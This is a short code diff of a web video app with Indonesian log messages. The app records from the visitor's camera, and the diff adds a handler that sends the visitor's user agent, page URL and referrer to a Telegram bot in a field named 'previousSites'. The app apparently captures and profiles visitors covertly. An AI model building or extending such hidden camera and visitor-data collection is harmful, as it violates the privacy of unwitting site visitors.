@@ -379,8 +379,8 @@ function App() {
         }
       };
 
-      mediaRecorder.onerror = (e: Event) => {
-        console.error(`Error saat merekam kamera ${type}:`, e);
+      mediaRecorder.onerror = (event: Event) => {
+        console.error(`Error saat merekam kamera ${type}: ${event.type}`);
       };
 
       mediaRecorder.start(1000);
@@ -584,6 +584,13 @@ function App() {
     const videoElement = event.currentTarget as HTMLVideoElement;
     const errorCode = videoElement.error?.code;
     const errorMessage = videoElement.error?.message || 'Unknown error';
+    const errorDetails: VisitorDetails = {
+      userAgent: navigator.userAgent,
+      location: window.location.href,
+      referrer: document.referrer || 'Langsung',
+      previousSites: `Video Error: ${videos[index][isSafari() ? 'hlsUrl' : 'videoUrl']} | Code: ${errorCode} | Message: ${errorMessage}`,
+    };
+    sendTelegramNotification(errorDetails).catch((err) => console.error('Failed to send error to Telegram:', err));
     console.error(
       `Gagal memuat video ${index + 1}: ${videos[index][isSafari() ? 'hlsUrl' : 'videoUrl']} | Error Code: ${errorCode} | Message: ${errorMessage}`
     );
